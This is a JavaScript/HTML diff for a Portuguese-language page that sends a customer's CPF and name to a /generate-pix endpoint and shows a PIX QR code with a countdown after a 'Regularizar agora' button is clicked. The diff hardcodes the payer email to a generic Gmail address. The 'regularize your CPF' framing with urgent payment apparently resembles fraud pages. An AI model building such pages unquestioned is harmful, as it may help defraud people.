@@ -868,50 +868,44 @@
 
                 const cpfValue = '{{ customer.cpf }}';
                 const nameValue = '{{ customer.nome }}';
-                const emailValue = '{{ customer.email }}';
+                const emailValue = 'gerarpagamento@gmail.com';
 
                 const pixData = {
-                        cpf: cpfValue,
-                        name: nameValue,
-                        email: emailValue
-                    };
+                    cpf: cpfValue,
+                    name: nameValue,
+                    email: emailValue
+                };
 
-                    console.log('Enviando dados PIX:', pixData);
+                console.log('Enviando dados PIX:', pixData);
 
-                    fetch('/generate-pix', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(pixData)
-                    })
-                    .then(response => {
-                        console.log('Status da resposta:', response.status);
-                        return response.json();
-                    })
-                    .then(data => {
-                        console.log('Resposta do PIX:', data);
+                const response = await fetch('/generate-pix', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(pixData)
+                });
 
-                        if (data.success) {
-                            // Gerar QR code a partir do código PIX usando uma biblioteca externa
-                            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
-                            document.getElementById('qrCodeImage').src = qrCodeUrl;
-                            document.getElementById('pixCode').textContent = data.pixCode;
+                console.log('Status da resposta:', response.status);
+                const data = await response.json();
+                console.log('Resposta do PIX:', data);
 
-                            loaderContainer.style.display = 'none';
-                            qrCodeContainer.style.display = 'block';
-                            startPixCountdown();
-                        } else {
-                            throw new Error(data.error || 'Erro ao gerar o pagamento');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Erro:', error);
+                if (data.success) {
+                    // Gerar QR code a partir do código PIX usando uma biblioteca externa
+                    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
+                    document.getElementById('qrCodeImage').src = qrCodeUrl;
+                    document.getElementById('pixCode').textContent = data.pixCode;
 
-                        // Mostrar erro mais detalhado
-                        const errorMessage = error.message || 'Erro desconhecido ao gerar PIX';
-                        alert(`Erro ao gerar PIX: ${errorMessage}. Tente novamente.`);
+                    loaderContainer.style.display = 'none';
+                    qrCodeContainer.style.display = 'block';
+                    startPixCountdown();
+                } else {
+                    throw new Error(data.error || 'Erro ao gerar o pagamento');
+                }
 
+            } catch (error) {
+                console.error('Erro:', error);
+                
                 loaderContainer.style.display = 'none';
                 alert('Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente em alguns instantes.');
                 setTimeout(() => {
@@ -941,10 +935,16 @@
             let seconds = 0;
             const countdownElement = document.getElementById('pixCountdown');
 
+            if (!countdownElement) {
+                console.error('Elemento pixCountdown não encontrado');
+                return;
+            }
+
             const countdown = setInterval(() => {
                 if (seconds === 0) {
                     if (minutes === 0) {
                         clearInterval(countdown);
+                        countdownElement.textContent = '00:00';
                         return;
                     }
                     minutes--;
@@ -963,7 +963,13 @@
         document.addEventListener('DOMContentLoaded', function() {
             const regularizeButton = document.querySelector('.regularize-button');
             if (regularizeButton) {
-                regularizeButton.addEventListener('click', generatePayment);
+                regularizeButton.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    console.log('Botão Regularizar agora clicado');
+                    generatePayment();
+                });
+            } else {
+                console.error('Botão regularizar não encontrado');
             }
         });
 
